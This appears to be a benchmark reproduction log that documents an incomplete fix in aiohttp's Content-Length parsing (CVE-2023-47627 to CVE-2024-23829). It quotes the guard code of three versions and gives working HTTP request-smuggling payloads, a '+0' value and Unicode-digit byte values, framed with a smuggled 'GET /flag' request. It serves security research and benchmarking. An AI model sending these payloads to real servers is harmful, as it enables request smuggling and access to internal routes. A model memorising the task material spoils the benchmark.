PatchClosure-Bench repro log — aiohttp-cve-2024-23829
Pair: CVE-2023-47627 (V1 = incomplete fix, TARGET) -> CVE-2024-23829 (V2 = complete fix)
Sink: aiohttp/http_parser.py pure-Python parser, get_content_length() (AIOHTTP_NO_EXTENSIONS=1)
Mechanism: CWE-444 HTTP request smuggling via obfuscated Content-Length; acceptance of the
malformed CL frames the front request with an empty body so a pipelined `GET /flag` smuggled
sub-request reaches the internal ${PCB_FLAG} route.
Oracle: Variant A (same sink, same flag channel). Docker Engine 29.4.0. Verified 2026-07-13.

Versions (official python:3.11-slim + pinned aiohttp, pure-Python parser confirmed at startup:
  "[harness ver=X aiohttp=X] parser=aiohttp.http_parser (python-parser=True)"):
  V0 = aiohttp 3.8.5  (pre-CVE-2023-47627; get_content_length uses int(length_hdr))
  V1 = aiohttp 3.8.6  (CVE-2023-47627 fix; length_hdr.strip(" \t").isdecimal())      [TARGET]
  V2 = aiohttp 3.9.2  (CVE-2024-23829 fix; DIGITS=re.compile(r"\d+", re.ASCII).fullmatch)

GUARD EVOLUTION (verbatim, http_parser.py get_content_length):
  V0 3.8.5:  try: length = int(length_hdr)
             except ValueError: raise InvalidHeader(CONTENT_LENGTH)
             if length < 0: raise InvalidHeader(CONTENT_LENGTH)
             return length
             # int() accepts "+0", "1_0" (underscores), leading/trailing sign, AND Unicode digits.
  V1 3.8.6:  # Shouldn't allow +/- or other number formats.
             if not length_hdr.strip(" \t").isdecimal():
                 raise InvalidHeader(CONTENT_LENGTH)
             return int(length_hdr)
             # BLOCKS "+0"/underscores, but str.isdecimal() is TRUE for any Unicode decimal
             # digit (Arabic-Indic U+0660, Fullwidth U+FF10, Devanagari U+0966, ...), and
             # int() then parses it -> RESIDUAL still accepted. (INCOMPLETE FIX)
  V2 3.9.2:  if not DIGITS.fullmatch(length_hdr):        # DIGITS = re.compile(r"\d+", re.ASCII)
                 raise InvalidHeader(CONTENT_LENGTH)
             return int(length_hdr)
             # re.ASCII restricts \d to [0-9] -> Unicode-digit CL rejected. (RESIDUAL CLOSED)

Header values decode utf-8 (bvalue.decode("utf-8","surrogateescape")), so the Unicode digit
survives to .isdecimal(). Confirmed same file/function/sink across V0->V1->V2 => genuine
incomplete-fix pair, NOT two unrelated parser-cluster bugs.

SEED (CVE-2023-47627), Content-Length: +0  (int accepts, isdecimal rejects):
  Content-Length header bytes = b"+0"
RESIDUAL (CVE-2024-23829), Content-Length: <Unicode decimal 0>  (isdecimal accepts, DIGITS re.ASCII rejects):
  b"\xd9\xa0" (U+0660 Arabic-Indic), b"\xef\xbc\x90" (U+FF10 Fullwidth), b"\xe0\xa5\xa6" (U+0966 Devanagari)

Both requests share the framing:
  POST / HTTP/1.1\r\nHost: t\r\nContent-Length: <VALUE>\r\n\r\nGET /flag HTTP/1.1\r\nHost: t\r\nConnection: close\r\n\r\n

